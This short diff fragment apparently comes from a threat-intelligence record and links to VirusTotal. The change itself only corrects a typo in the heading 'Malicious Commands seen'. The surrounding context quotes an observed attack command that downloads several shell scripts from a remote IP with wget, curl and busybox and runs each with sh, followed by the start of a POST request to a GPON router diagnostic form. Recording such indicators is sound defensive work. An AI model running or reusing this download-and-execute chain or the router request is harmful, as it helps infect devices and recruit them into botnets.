@@ -16,7 +16,7 @@ https://www.virustotal.com/gui/file/368db826e005f6314108ccb511f13fbf72d72c280525
 
 
 
-Malcious Commands seen:
+Malicious Commands seen:
 cd /data/local/tmp/; busybox wget http://103.78.0.41/w.sh; sh w.sh; curl http://103.78.0.41/c.sh; sh c.sh; wget http://103.78.0.41/wget.sh; sh wget.sh; curl http://103.78.0.41/wget.sh; sh wget.sh; busybox wget http://103.78.0.41/wget.sh; sh wget.sh; busybox curl http://103.78.0.41/wget.sh; sh wget.sh
 
 POST /GponForm/diag_Form?images/ HTTP/1.1
